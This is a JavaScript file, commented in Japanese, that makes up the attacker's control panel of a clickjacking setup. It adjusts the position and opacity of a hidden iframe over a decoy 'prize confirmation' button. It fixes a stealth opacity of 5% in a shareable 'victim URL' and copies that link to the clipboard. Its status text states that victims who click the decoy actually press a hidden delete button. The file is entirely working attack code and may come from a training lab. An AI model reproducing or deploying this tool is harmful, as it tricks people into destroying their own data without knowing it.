// クリックジャッキング コントロールパネル JS (CSP 対応: 外部ファイル)

var stageWin = null;

function getStageUrl() {
  return window.location.origin + '/attacker-cj/stage';
}

// 現在のスライダー値を含む被害者用URL を生成
function buildVictimUrl() {
  var x = document.getElementById('x-slider').value;
  var y = document.getElementById('y-slider').value;
  // opacity はステルス(5%)固定 — 被害者には透明に見せる
  return getStageUrl() + '?x=' + x + '&y=' + y + '&opacity=5';
}

// 被害者用URL表示フィールドを更新
function refreshVictimUrl() {
  var el = document.getElementById('victim-url');
  if (el) el.value = buildVictimUrl();
}

function openStage() {
  if (!stageWin || stageWin.closed) {
    var w = screen.width;
    var h = screen.height;
    stageWin = window.open(
      buildVictimUrl(),  // URL パラメータ付きで開く → 同一ブラウザでも位置が即反映
      'cj_stage',
      'width=' + w + ',height=' + h + ',left=0,top=0' +
      ',resizable=yes,scrollbars=no,toolbar=no,menubar=no,status=no'
    );
    setTimeout(sendUpdate, 1200);
  } else {
    stageWin.focus();
    sendUpdate();
  }
  refreshVictimUrl();
}

// ステージからの準備完了通知 (同一ブラウザのみ)
window.addEventListener('message', function (e) {
  if (!e.data || e.data.type !== 'cj-ready') return;
  sendUpdate();
});

// スライダーの値を取得してステージウィンドウに postMessage で送信
function sendUpdate() {
  if (!stageWin || stageWin.closed) return;
  var opacity = +document.getElementById('opacity-slider').value;
  var x = +document.getElementById('x-slider').value;
  var y = +document.getElementById('y-slider').value;
  stageWin.postMessage({ type: 'cj-update', opacity: opacity, x: x, y: y }, '*');
  refreshVictimUrl();
}

function setOpacity(v) {
  document.getElementById('opacity-val').textContent = v + '%';
  updateStatusBox(+v);
  sendUpdate();
}

function setX(v) {
  document.getElementById('x-val').textContent = v;
  sendUpdate();
  refreshVictimUrl();
}

function setY(v) {
  document.getElementById('y-val').textContent = v;
  sendUpdate();
  refreshVictimUrl();
}

function updateStatusBox(opacity) {
  var box = document.getElementById('status-box');
  if (opacity > 20) {
    box.className = 'atk-status ok';
    box.innerHTML = '👁 半透明モード: iframe が透けて見えます。削除ボタンとデコイボタンの重なりを確認してください。';
  } else {
    box.className = 'atk-status warn';
    box.innerHTML = '⚠ ステルスモード: 被害者にはデコイだけが見えています。「当選を確認する」クリック → 実際には削除ボタンが押されます。';
  }
}

function applyPreset(opacity, x, y) {
  document.getElementById('opacity-slider').value = opacity;
  document.getElementById('x-slider').value = x;
  document.getElementById('y-slider').value = y;
  document.getElementById('opacity-val').textContent = opacity + '%';
  document.getElementById('x-val').textContent = x;
  document.getElementById('y-val').textContent = y;
  updateStatusBox(opacity);
  sendUpdate();
  refreshVictimUrl();
}

function confirmPosition() {
  sendUpdate();
  refreshVictimUrl();
  var box = document.getElementById('status-box');
  var prevClass = box.className;
  var prevHtml  = box.innerHTML;
  box.className = 'atk-status info';
  box.innerHTML = '✅ 位置を確定しました。ステージウィンドウに反映されました。';
  setTimeout(function () {
    box.className = prevClass;
    box.innerHTML = prevHtml;
  }, 2000);
}

function copyVictimUrl() {
  var url = buildVictimUrl();
  navigator.clipboard.writeText(url).then(function () {
    var btn = document.getElementById('copy-btn');
    var orig = btn.textContent;
    btn.textContent = '✅ コピーしました';
    btn.style.background = '#16a34a';
    setTimeout(function () {
      btn.textContent = orig;
      btn.style.background = '';
    }, 2000);
  }).catch(function () {
    // clipboard 非対応の場合はフィールドを選択
    document.getElementById('victim-url').select();
  });
}

// ページロード時に初期URLを設定
window.addEventListener('DOMContentLoaded', refreshVictimUrl);
